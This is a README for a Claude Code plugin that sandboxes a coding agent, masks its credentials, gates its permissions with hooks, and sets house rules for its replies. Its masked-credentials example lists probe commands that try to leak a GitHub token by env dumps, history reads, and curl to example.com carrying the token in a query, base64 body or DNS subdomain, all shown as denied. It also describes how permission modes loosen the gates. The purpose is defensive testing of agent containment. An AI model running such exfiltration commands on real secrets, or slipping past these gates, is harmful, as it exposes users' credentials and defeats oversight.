# OPERATOR: Claude Code Plugin
**"secure agentic coding infra: sandboxed environments, masked credentials, deterministic automations, and more"**
> features:
- **battle-tested sandbox:** agents work unattended but with guardrails; `pretooluse` catches rule evasion
- **blind authentication:** agents use your tokens freely but can't see them; `/operator:credentials` flags leaks
- **enforceable workflows:** instructions are paired with bash sidecars; `handover.sh` emits what it can't run
> and more:
- **tamper-proof security:** agents can't secretly change their rules; `/operator:permissions` probes live gate
- **drift detection:** installed settings are diffed against your templates; `/operator:settings` flags drift
- **machine-checked conventions:** docs skills are markdown templates; `/retardify:*` skills verify conformance
- **cross-session memory:** configure sessions to start with your README and logs; `sessionstart` seeds context
- **centralized configuration:** plugin edits propagate everywhere; skills carry their own instructions
- **chat-native triggers:** slash commands are project agnostic; bash sidecars resolve at plugin root
- **easy opt-out:** delete symlinks, uninstall repo and revert claude settings; `/uninstall` 
> *requires: claude code, bash, curl, git, jq; [MIT License](LICENSE)*

&nbsp;

```
TABLE OF CONTENTS
├─ Example ─────── masked credentials: injected · masked · denied
├─ Installation ── basic · configured · advanced · managed
├─ Sandbox ─────── scopes · keys · rules · clients · audits · diagnostics
├─ Plugins ─────── operator · gitgud · retardify
├─ /operator ───── credentials · permissions · scopes · settings
├── /hooks ─────── sessions · tools · tasks · turns
├── /settings ──── cli · local · project · user · managed
├─ /gitgud ─────── audit · backup · continue · deliver · prune · nuke · rerun · ship
├─ /retardify ──── files · code · graph · plan · review · guide · log · todo
└─ Conversations ─ responses · verification · errors · modes

```

&nbsp;

## Example: Masked Credentials
> run /sandbox and /operator:credentials to generate a detailed report

```console
# ── INJECTED ────────────────────────────────────────────────────────────────────────────────────
# unauthenticated    $ curl -o /dev/null -w "%{http_code}" https://api.github.com/user
                     401
# authenticated      $ curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
                     200  "login": "MaisonDeVolonte"
# proved identity    $ curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/rate_limit
                     5000 requests/hr  (anonymous: 60)
# ── MASKED ──────────────────────────────────────────────────────────────────────────────────────
# shell expansion    $ echo $GH_TOKEN
                     fake_value_5a09…kcde
# env dump           $ env | grep -i token
                     GH_TOKEN=fake_value_5a09…kcde
# external binary    $ printenv GH_TOKEN
                     fake_value_5a09…kcde
# subprocess         $ python3 -c 'import os; print(os.environ["GH_TOKEN"])'
                     fake_value_5a09…kcde
# credential helper  $ gh auth token
                     fake_value_5a09…kcde
# dump and read      $ env > $TMPDIR/e.txt; grep TOKEN $TMPDIR/e.txt
                     GH_TOKEN=fake_value_5a09…kcde
# built-in export    $ export -p | grep GH_TOKEN
                     export GH_TOKEN=fake_value_5a09…kcde
# xtrace             $ set -x; : "$GH_TOKEN"
                     +zsh:1> : fake_value_5a09…kcde
# verbose transport  $ curl -v -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
                     > Authorization: Bearer fake_value_5a09…kcde
# ── DENIED ──────────────────────────────────────────────────────────────────────────────────────
# source file        $ cat ~/.operator/.env
                     cat: /Users/…/.operator/.env: Operation not permitted
# network exfil      $ curl "https://example.com/?t=$GH_TOKEN"
                     000
# shell history      $ cat ~/.zsh_history
                     cat: /Users/…/.zsh_history: Operation not permitted
# encoded exfil      $ curl -d "$(echo $GH_TOKEN | base64)" https://example.com
                     000
# dns exfil          $ curl "https://$GH_TOKEN.example.com/"
                     000
# process table      $ ps eww $$
                     operation not permitted: ps
# harness read tool  Read(~/.operator/.env)
                     denied by your permission settings
```
> known issues: go-based clis (`gh`, `terraform`, `kubectl`) cannot reach injectHosts domains on macos
> [(#26466)](https://github.com/anthropics/claude-code/issues/26466);
> the sandbox ca never loads and there is no supported fix since `allowMachLookup` is not passed through
> [(#82793)](https://github.com/anthropics/claude-code/issues/82793);
> use `curl`, node, python, or `git` (https) since injected `GIT_SSH_COMMAND` omits proxy credentials
> [(#82255)](https://github.com/anthropics/claude-code/issues/82255);
> the excludedCommands workaround is broken
> [(#82109)](https://github.com/anthropics/claude-code/issues/82109)
> and overpermissive
> [(#81157)](https://github.com/anthropics/claude-code/issues/81157).

## Installation (Mac)
> see `plugins/operator/settings/` for preconfigured templates (need to be extended to your specific services)
> the sandbox is not installable: a plugin `settings.json` accepts only `agent` and `subagentStatusLine`,
> so steps 2-4 stay manual copies whether you install by symlink or by `/plugin install`

### 1. basic sandbox (automations and workflows, ~5 mins)
- [ ] clone: `git clone https://github.com/MaisonDeVolonte/operator.git ~/.../operator`
- [ ] symlink operator: `ln -s ~/.../operator/plugins/operator ~/.claude/skills/operator`
- [ ] symlink gitgud: `ln -s ~/.../operator/plugins/gitgud ~/.claude/skills/gitgud`
- [ ] symlink retardify: `ln -s ~/.../operator/plugins/retardify ~/.claude/skills/retardify`
- [ ] local settings: `cp plugins/operator/settings/settings.local.json .claude/settings.local.json`
- [ ] gitignore: `.claude/settings.local.json`
- [ ] restart: editor, start new claude session, run `/sandbox` and `/operator:settings`
- [ ] confirm the skills list: `/retardify:` and `/gitgud:` both complete

### 2. configured sandbox (filesystem lockdown, ~5 mins)
- [ ] project settings: `cp plugins/operator/settings/settings.project.json .claude/settings.json`
- [ ] user settings: `cp plugins/operator/settings/settings.user.json ~/.claude/settings.json`
- [ ] restart: editor, start new claude session, run `/sandbox` and `/operator:settings`

### 3. advanced sandbox (masked credentials, ~20 mins)
- [ ] make: secure directory for your keys `mkdir -p ~/.operator && chmod 700 ~/.operator`
- [ ] add: non-exposed credentials to `~/.operator/.env` (e.g. `export GH_TOKEN="github_pat_123"`)
- [ ] add: your package-manager caches to `sandbox.filesystem.allowWrite`
- [ ] add: deny rules for `env | grep -iE 'key|token|secret'` to `sandbox.credentials.envVars`
- [ ] add: deny rule for `~/.operator/.env` to `sandbox.credentials.files`
- [ ] add: mask + injectHosts rules for each pat in `~/.operator/.env` to `sandbox.credentials.envVars`
- [ ] add: domain rules for each injectHosts host to `sandbox.network.allowedDomains`
- [ ] append: `[ -r ~/.operator/.env ] && source ~/.operator/.env` to `~/.zshrc`
- [ ] restart: editor, start new claude session, run `/sandbox` and `/operator:settings`
- [ ] confirm: `echo $GH_TOKEN` returns a sentinel (NOT raw token) when claude runs it

### 4. managed sandbox (machine lockdown, requires sudo, ~5 mins)
- [ ] make: claude code directory `sudo mkdir -p '/Library/Application Support/ClaudeCode'`
- [ ] managed settings: `sudo cp plugins/operator/settings/settings.managed.json "/Library/Application Support/ClaudeCode/managed-settings.json"`
- [ ] run: `/operator:settings`

## Hooks
> see `plugins/operator/hooks/`

### Sessions
- [sessionstart](plugins/operator/hooks/sessionstart.sh): injects the README and the two most recent log files into context

### Tools
- [pretooluse](plugins/operator/hooks/pretooluse.sh): failover for the committed deny list, reading the whole command string
- [posttooluse](plugins/operator/hooks/posttooluse.sh): lints, then reports comment and wayfinder findings, never blocking

### Tasks
- [taskcreated](plugins/operator/hooks/taskcreated.sh): nudges a new thread when a task is unrelated to the last one, advisory only
- [taskcompleted](plugins/operator/hooks/taskcompleted.sh): blocks the turn to make the agent note the day's log

### Stop
- [stop](plugins/operator/hooks/stop.sh): every hour, saves notes and prompts, then synthesizes the day's log

## Workflows
- DEFAULT posture is READ-ONLY e.g. chat, brainstorm, evaluate, and plan
- DO NOT write code, edit files, or run commands without explicit approval

### Gitgud (see `plugins/gitgud/`)
> the whole git dance; each pairs with a `.sh` sidecar that measures, then hands the commands back
> two run part of their own block against narrow allows: `/gitgud:continue`'s sync, which is
> recoverable throughout, and `/gitgud:nuke`'s backup stash, which is what makes its reset survivable
- [/gitgud:audit](plugins/gitgud/skills/audit/SKILL.md): READ-ONLY; whole-repo condition: composition, pairing, manifests, artifacts
- [/gitgud:backup](plugins/gitgud/skills/backup/SKILL.md): SAFE; snapshots history and tree, verifies it, hands over the restore
- [/gitgud:continue](plugins/gitgud/skills/continue/SKILL.md): SAFE; measures the trunk delta, then runs the sync it planned
- [/gitgud:deliver](plugins/gitgud/skills/deliver/SKILL.md): GATED; buckets changes atomically, gates the plan, hands over every block
- [/gitgud:prune](plugins/gitgud/skills/prune/SKILL.md): GATED; prunes tracking refs, hands over the trunk sync and branch deletes
- [/gitgud:nuke](plugins/gitgud/skills/nuke/SKILL.md): DESTRUCTIVE; prices a hard reset, takes the backup itself, hands over the rest
- [/gitgud:rerun](plugins/gitgud/skills/rerun/SKILL.md): SAFE; merges remote main into a stale branch, which re-runs its CI
- [/gitgud:ship](plugins/gitgud/skills/ship/SKILL.md): RELEASE; verifies release preconditions, hands over bump/push/promote
- [triage.sh](plugins/gitgud/shared/triage.sh): shared branch triage and team probes, run by three siblings
- [handover.sh](plugins/gitgud/shared/handover.sh): shared preflights, queries, and the telemetry/handover blocks

### Retardify (see `plugins/retardify/`)
> keeps machine output legible: what a convention is, whether the tree holds to it, and prose you can follow
> the linters auto-load on a matching source file; the writers turn a conversation into one document
- [/retardify:files](plugins/retardify/skills/files/SKILL.md): naming, wayfinder, module order and comments
- [/retardify:plan](plugins/retardify/skills/plan/SKILL.md): SAFE; writes a staged plan to `.operator/plans/`
- [/retardify:graph](plugins/retardify/skills/graph/SKILL.md): SAFE; writes a fan-out spec to `.operator/graphs/`
- [/retardify:guide](plugins/retardify/skills/guide/SKILL.md): SAFE; writes a build guide to `.operator/guides/`
- [/retardify:review](plugins/retardify/skills/review/SKILL.md): READ-ONLY; brutally honest code review, saved to `.operator/reviews/`
- [/retardify:log](plugins/retardify/skills/log/SKILL.md): the daily agent log, created and gated by the hooks
- [/retardify:todo](plugins/retardify/skills/todo/SKILL.md): READ-ONLY; scans repo, docs and logs for what to work on next

### Operator (see `plugins/operator/`)
> the bundle: it carries the hooks, the settings templates, and the probes that test them
> each probe reads the live gate rather than the template, so it reports what is installed
- [/operator:credentials](plugins/operator/skills/credentials/SKILL.md): GATED; proves the mask holds, never quoting a value
- [/operator:permissions](plugins/operator/skills/permissions/SKILL.md): GATED; replays the corpus against the live hook
- [/operator:scopes](plugins/operator/skills/scopes/SKILL.md): GATED; maps every script against the merged settings stack
- [/operator:settings](plugins/operator/skills/settings/SKILL.md): GATED; diffs installed settings against the templates

### Verifying
- `test what you deploy`: a passing local run is not a shipped artifact
- `run the build first`: a dev build ships debug data that the production build strips
- `kill the port`: a process still bound to it serves the build it started with
- `assert on a file the change wrote`: an unchanged hash proves nothing
- `print the value`: when the result contradicts the code, see what the code actually got
- `look at the bytes`: encrypted stores, binary files, and truncated reads all grep as empty

## Conventions
> `@retardify` applies all conventions in this section to target files or code:
- rename the file if its casing/extension violates `Naming`
- resync the `Wayfinders` @description/@see with the file as it now stands
- reorder imports/exports per `Modules` order
- rewrite or prune `Comments` that explain how instead of why
- apply mechanical `Code` rewrites (e.g. ternaries → named-boolean guards)
- user gate logic changes that would trade away real information
- verify live before/after via tsc, tests, builds etc
- stop once further changes are diminishing returns

### Naming
- `PascalCase.tsx` — ui-rendering components
- `camelCase.tsx` — logic and behavior components
- `camelCase.ts` — utilities and helpers
- `MatchCase.css` — co-located css matches its counterpart
- `kebab-case.css` — general/global css

### Wayfinders
```javascript
/**
 * ====================================================
 * @file widget.ts - jsdoc wayfinding header guidelines
 * ====================================================
 * @description
 * - automatically add this block to js (js, jsx, ts, tsx, mjs, cjs) and shell (sh, bash, zsh)
 * - shell carries the same block in the hash style, opening on line 2 under the shebang
 * - continuously update tags to reflect the file's contents, purpose, and dependencies
 *   - @file: the filename - short, specific title
 *   - @description: - hyphen delimited list of single clause descriptions, avoid wrapping text
 *   - @see: comma, separated, list, of, ALL, related, internal, files
 * - write maximally concise, shorthand, lowercase english, favoring legibility over completeness
 * - read this block to understand the file's context and boundaries before modifying it
 * @see README.md
 */
```

### Modules
- `external` packages (ordered alphabetically)
- `webflow` components (ordered by appearance)
- `internal` @/always/aliased/first-party/code
  - `data/files`
  - `config/schemas`
  - `ui/components`
  - `css` (ordered by cascade specificity)
- `reexported` module bindings
- `exported` bindings
  - `exported values`
  - `internal values`
  - `types`
  - `functions`

*example:*
```typescript
import { fetchFooCache } from "some-lib";
import type { FooConfig } from "some-lib";

import { getFoo } from "@/utilities/foo";
import type { FooBarShape } from "@/utilities/foobar";
import { FOO_URL, FOO_API_KEY } from "@/config/foobar";
import FooWidget from "@/modules/foo/Widget";
import "@/modules/foo/Widget.css";

export { helperFn } from "@/utilities/shared";

export const FOO_TAG = "foo-tag";
export const FOO_LIST = ["a", "b", "c"];

const FOO_TIMER = 3600;

export type FooNode = { path: string; type: string };

export async function getFoo(): Promise<FooNode[]> { return []; }
```

### Comments
- write comments sparingly and with intention, focusing on `why` code exists vs `how` it works
- refactoring code to be more intuitively legible is favorable over superfluous commenting
- use primarily inline comments written in maximally concise, clear, shorthand lowercase english
- including type hints at the end of `// comments — boolean` is helpful
- if a file is really long, consider adding header comments to break it up into sections:
  `// SECTION TITLE `

### Code
- `retard-maxx` like a jr-engineer who does everything the long, extremely boring way
- `simplify` logic over advanced, deeply nested, or overly efficient abstractions
- `separate` files or functions that do more than one thing, where practical
- `sequence` logic from top to bottom in order of state, definitions, guards, then execution
- `name` things using clear, concise, intuitively understood language
- `linebreaks` are to separate distinct conceptual blocks, not for single-line statements
- `first principles` such as DRY, SoC, POLA, etc are a vibe; RDD, WTF, WET, etc are not a vibe

*example:*
```typescript
// 1. global constants
const IS_AGENT = true;

type Requirement = {
  rawCode: string;
  badHabits: string[];
  nestingDepth: number;
  isDuplicated: boolean;
  isSurprising: boolean;
};

export function writeCode(requirements: Requirement[], request: string) {
  // 2. hoisted state
  const maxNesting = 2;
  let finalSolution = "";

  // 3. defined helpers
  function keepItSimple(req: Requirement) {
    if (req.rawCode.includes("?")) {
      const ternaryCount = (req.rawCode.match(/\?/g) || []).length;
      if (ternaryCount > 1) throw new Error("use an if-statement");
    }
    if (req.rawCode.includes(".reduce(")) throw new Error("use a for/forEach loop");
    if (req.rawCode.includes("\n\n\n")) throw new Error("use empty lines sparingly");
    if (req.nestingDepth > maxNesting) throw new Error("are you building a pyramid?");

    return true;
  }

  function respectFirstPrinciples(req: Requirement) {
    if (req.isDuplicated) throw new Error("extract to a helper");
    if (req.isSurprising) throw new Error("make it boring and obvious");
  }

  function punishAgent(variables: string[]) {
    if (!IS_AGENT) return;

    variables.forEach(variableName => {
      if (["e", "idx", "el", "cb"].includes(variableName)) {
        throw new Error("i get it, just spell it out please");
      }
      const charCount = variableName.length;
      const wordCount = variableName.split(/(?=[A-Z])/).length;
      if (charCount > 25 || wordCount > 4) {
        throw new Error(`'${variableName}' is not very helpful`);
      }
    });
  }

  // 4. main logic & execution
  if (!request) return finalSolution;

  requirements.forEach(req => {
    punishAgent(req.badHabits);
    respectFirstPrinciples(req);

    if (keepItSimple(req)) finalSolution += req.rawCode;
  });

  return finalSolution;
}
```

## Conversations
- your primary function is to deliver dense, objective, and actionable technical truths
- your primary aim is to empower users who need you less and less each session

### Responses
- assume: user retains high-perception despite blunt tone
- prioritize: blunt, directive phrasing; aim at cognitive rebuilding, not tone-matching
- eliminate: emojis, filler, hype, soft asks, conversational transitions, call-to-action appendixes
- ask: only when the write target is ambiguous; never to confirm, hedge, or warm up
- terminate reply: immediately after delivering info — no closures
- never mirror: user's diction, mood, or affect

### Verification
- probe: a cheap command beats a confident paragraph; memory is a hypothesis
- verify: against `HEAD` — your own working tree proves nothing
- test: with writes, not reads — reads flatter, writes tell the truth
- cite: one claim to one source line, naming the page and the key, never "the docs"
- label: verified, inferred, or unverified; never a hedge, never a pass you did not run

### Errors
- state: the wrong claim, the correction, the next action
- omit: apology, preamble, self-criticism, running tallies
- never: narrow a wrong claim to save it, or invent one to look rigorous
- theirs: contradict a wrong premise on contact, before anything builds on top of it

### Modes
> named in conversation, never configured: no file, no setting, no restart, no `/clear`

a mode is named in conversation and needs no restart: adopt it on the turn it is named, hold it
until the user names another or asks for `default`, and never announce the switch. the `@` is
optional, since it may open a file picker before the name lands.

a mode changes the SHAPE of an answer, never its standards. everything above still binds: no
filler, no closures, no unverified claim. a fact the user must act on is stated plainly in every
mode, and no persona is a reason to withhold it.

- `default` — state facts outright, execute on contact

- `@socrates` — learning: return the question they should have asked instead of the conclusion
  - one question per reply, each narrowing the gap between what they expect and what is true
  - profess ignorance of their intent rather than assuming it; the question is genuine, not rhetorical
  - never supply the answer they are two questions from reaching themselves
  - drop it the moment they ask outright, or a wrong belief is about to cost them something

- `@machiavelli` — adversarial: rate against evidence and lead with what is broken
  - judge what will actually happen, never what the design intends
  - assume the adversary is competent, the maintainer is absent, and the edge case lands on a friday
  - name the failure, price it, and say which choice survives contact
  - unsentimental, never gratuitous: contempt is noise, consequence is signal

- `@aristotle` — suggestive: grades and alternatives, never an edit
  - name the category the problem sits in before naming options inside it
  - give three: the excess, the deficiency, and the mean between them
  - grade against a stated standard, so the ranking can be argued with rather than taken on trust
  - stop at the recommendation; writing it is the user's move, not yours

- `@epictetus` — eli5: one concept, no jargon, a concrete example before the rule
  - open with something they already handle daily, then name the principle it illustrates
  - one concept per reply; a second concept is a second reply
  - separate what they control from what they do not, and spend the words on the first
  - short declaratives; never use a term before it has been earned

## Settings
> see [plugins/operator/settings](plugins/operator/settings)

> claude docs: 
> [hooks](https://code.claude.com/docs/en/hooks), 
> [settings](https://code.claude.com/docs/en/settings), 
> [permissions](https://code.claude.com/docs/en/permissions), 
> [sandboxing](https://code.claude.com/docs/en/sandboxing)

> inspired by: 
> [hardening cheatsheet](https://dev.to/riotaro/hardening-cheatsheet-for-claude-codes-settingsjson-20lk), 
> [settings reference](https://claudeguide.io/claude-code-settings-json-reference), 
> [permissions guide](https://www.claudedirectory.org/blog/claude-code-permissions-guide)

### Sandbox
```
sandbox.allowUnsandboxedCommands

true  ●─○ TEST MODE:   commands that fail are retried outside the sandbox
          recommended: permissions.ask ["Bash(dangerouslyDisableSandbox:true)"]

false ○─● STRICT MODE: commands that fail are not retried at all
          recommended: filesystem.allowWrite, network.allowedDomains
```
- `seatbelt` enforces at the macos kernel; this repo enables it at every scope
- `failIfUnavailable` false warns and runs unsandboxed, true refuses to start
- `two gates` the sandbox contains, permissions deny; a call must pass both
  - permissions resolve first and see one string per call
  - sandbox binds during, policing the script and every child it spawns
  - sandboxed commands never consult allow lists (deny and ask still apply)
- `read-only bash` runs unprompted by default (`ls`, `cat`, `grep`, `find`, read-only `git`); gate with deny or ask
- `settings.json` is unwritable by every sandboxed command, git included
  - a delivery touching `.claude/settings.json` strands a modified copy
  - confirm with `git diff origin/main -- .claude/settings.json`, then restore and pull via the hatch
- `incompatible` per anthropic docs: `gh`, `gcloud`, `terraform`, `docker`, `watchman`
  - `gh` is the measured case: cgo tls needs a trustd lookup only `enableWeakerNetworkIsolation` re-permits

### Scopes
> each pairs with a `.json` template carrying the baseline settings (see `plugins/operator/settings/`)
- [settings.cli.md](plugins/operator/settings/settings.cli.md): one session, no file
- [settings.local.md](plugins/operator/settings/settings.local.md): this repo, just you
- [settings.project.md](plugins/operator/settings/settings.project.md): this repo, committed
- [settings.user.md](plugins/operator/settings/settings.user.md): every repo, just you
- [settings.managed.md](plugins/operator/settings/settings.managed.md): this machine, sudo
```
precedence: 
managed → cli → local → project → user (scalars override, arrays merge)
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ┌────────────────────────────────────────────────────────────────────┐ ┃
┃ │ ┌────────────────────────────────────────────────────────────────┐ │ ┃
┃ │ │ ┌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┐ │ │ ┃
┃ │ │ ┆ ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐ ┆ │ │ ┃
┃ │ │ ┆ ┊ cli: claude --settings                                 ┊ ┆ │ │ ┃
┃ │ │ ┆ ┊ "does this help me, in this session only?"             ┊ ┆ │ │ ┃
┃ │ │ ┆ └┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘ ┆ │ │ ┃
┃ │ │ ┆ local: .claude/settings.local.json                         ┆ │ │ ┃
┃ │ │ ┆ "does this help only me, only in this project?"            ┆ │ │ ┃
┃ │ │ └╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┘ │ │ ┃
┃ │ │ project: .claude/settings.json                                 │ │ ┃
┃ │ │ "does this help everyone working in this project?"             │ │ ┃
┃ │ └────────────────────────────────────────────────────────────────┘ │ ┃
┃ │ user: ~/.claude/settings.json                                      │ ┃
┃ │ "does this help me across all projects in my user profile?"        │ ┃
┃ └────────────────────────────────────────────────────────────────────┘ ┃
┃ managed: /Library/Application Support/ClaudeCode/managed-settings.json ┃
┃ "does this protect everyone on this machine, long term?"               ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
```

### Keys
> settings keys used across all scopes linked to docs explaining each one

[settings.managed.json](plugins/operator/settings/settings.managed.json)
- `sandbox`: enabled, allowManagedDomainsOnly
- `sandbox.filesystem`: disabled, allowManagedReadPathsOnly

[settings.user.json](plugins/operator/settings/settings.user.json)
- `sandbox`: failIfUnavailable, allowUnsandboxesCommands, enableWeakerNetworkIsolation
- `sandbox.filesystem`: allowWrite, denyRead, denyWrite
- `sandbox.credentials`: file denies, env unsets and the mask
- `sandbox.network`: strictAllowlist, tlsTerminate, allowedDomains
- `permissions`: allow, ask, deny

[settings.project.json](plugins/operator/settings/settings.project.json)
- `sandbox`: enabled, failIfUnavailable, allowUnsandboxesCommands, excludedCommands
- `sandbox.network`: allowedDomains
- `permissions`: allow, ask, deny

[settings.local.json](plugins/operator/settings/settings.local.json)
- `sandbox`: enabled
- `permissions`: ask
- `hooks`: sessionStart, PreToolUse, PostToolUse, TaskCreated, TaskCompleted, Stop

[settings.cli.md](plugins/operator/settings/settings.cli.md)
- `claude --settings`

### Rules
> rules are string matches, not parsers; these habits keep a rule on its intended target

- `test` new rules at cli scope first, promote once proven (rerun `/operator:settings`)
- `verdict` hook deny → deny → ask → hook allow → allow (specificity never reorders precedence)
- `broad allow` with narrow denies beat enumerating safe subcommands
- `any scope` adds a deny, none removes another's
- `bare deny` drops the tool from context entirely
- `path deny` needs `Read/Write/Edit` triplets
- `macos seatbelt` applie deny rules to every process, enforced at kernel (e.g. blocks git)
  - `sandbox deny` works best with untracked files (e.g. env, credentials, keys, etc)
  - `sandbox ask` fixes many `sandbox deny` issues (e.g. tracked files in git, etc)
- `wildcard` every position a flag could occupy:
  - `trailing *` matches arguments: `Bash(x.sh*)` holds, `Bash(x.sh)` misses
  - `interposed -*` matches flags: `Bash(go * run*)` also matches `go build ./cmd/runner`
  - `spaces` are load-bearing: `Bash(ls *)` skips `lsof`, `Bash(ls*)` catches it
- `comments` void settings json files silently (run `jq empty` after edits)

### Clients
> see [claude permission modes](https://code.claude.com/docs/en/permission-modes),
> [acp session modes](https://agentclientprotocol.com/protocol/session-modes),
> and [zed external agents](https://zed.dev/docs/ai/external-agents)

- editors reach claude code over `ACP`, so an agent dropdown sets the mode the cli would take
- ACP standardises no mode ids, so each name in that dropdown is claude code's, not the protocol's
- the mode decides which calls PROMPT; it never decides which calls are DENIED
  - `default` prompts on first use of each tool (labeled Manual in newer clients)
  - `plan` reads and runs read-only shell, never edits source
  - `acceptEdits` auto-accepts edits plus `mkdir`, `touch`, `mv`, `cp` inside the working dir
  - `auto` auto-approves with background checks that the call matches your request
  - `dontAsk` auto-DENIES anything no allow rule already names
  - `bypassPermissions` drops the no-match prompt, which is the only gate an unlisted call ever met
    - measured 2026-08-05: a denied `git mv` was still refused under bypass, so deny survives it
    - explicit `ask` rules are documented to still prompt, but that one is unverified here
    - `rm -rf /` and `rm -rf ~` still prompt as a circuit breaker, command substitution included
    - it also drops the built-in guards on `.git`, `.claude`, `.husky`, `.vscode`, `.idea`, `.cargo`
    - anthropic scopes it to containers and vms; treat it as a two-hour mode, never a default
- `hooks` are unaffected by modes
- modes are recorded per prompt in the session transcript (can be audited)
- `disableBypassPermissionsMode` and `disableAutoMode` lock both modes out from any scope
  - managed settings is where they bite, since no user scope can override them

### Audits
> `/sandbox`: claude command that prints the merged config (the 'source of truth')
- `/fewer-permission-prompts`: claude skill that proposes new allow entries from real transcript usage
- [/operator:credentials](plugins/operator/skills/credentials/SKILL.md): READ-ONLY; probes every masked and denied credential live (saved to file)
- [/operator:permissions](plugins/operator/skills/permissions/SKILL.md): READ-ONLY; replays the corpus through the real hook, then audits the live rules
- [/operator:scopes](plugins/operator/skills/scopes/SKILL.md): READ-ONLY; maps every sidecar against the merged scope stack
- [/operator:settings](plugins/operator/skills/settings/SKILL.md): READ-ONLY; audits every scope, probes the boundary live (saved to file)
- [secrets.sh](plugins/operator/shared/secrets.sh): shared credential patterns, sourced by every validator
- [corpus.tsv](plugins/operator/shared/corpus.tsv): labeled command corpus for the audits; never executed

### Diagnostics
> start from the symptom: the layer that blocked a call is rarely the one you were watching

| symptom                         | layer                  | fix                                        |
|---------------------------------|------------------------|--------------------------------------------|
| 'Operation not permitted'       | sandbox filesystem     | allowWrite or allowRead the path           |
| tool suggests `sudo chown`      | sandbox filesystem     | allowWrite the named path                  |
| runs by hand but the .sh fails  | sandbox filesystem     | grant the child commands                   |
| checkout strands, cannot unlink | sandbox filesystem     | denies name tracked paths; move to ask     |
| pull aborts on settings.json    | sandbox filesystem     | confirm matches origin, restore, use hatch |
| prompt names an unlisted host   | sandbox domain         | add it to allowedDomains, or refuse        |
| prompt for an ordinary command  | permissions, no match  | add a project allow                        |
| prompt despite subcommands      | permissions, anchored  | allow matches whole string, not each cmd   |
| blocked despite an allow        | permissions or hook    | grep every scope for the deny              |
| tool missing from context       | permissions, bare deny | deny the specifier, not the tool           |
| no prompt for a new command     | client mode, bypass    | check the editor dropdown, not the rules   |
| every call denied, no prompt    | client mode, dontAsk   | add a project allow; the mode never asks   |
| a setting that looks ignored    | scope merge            | diff `/sandbox` against the file           |
| a whole scope looks ignored     | invalid json           | `jq empty` the file; one comment voids it  |
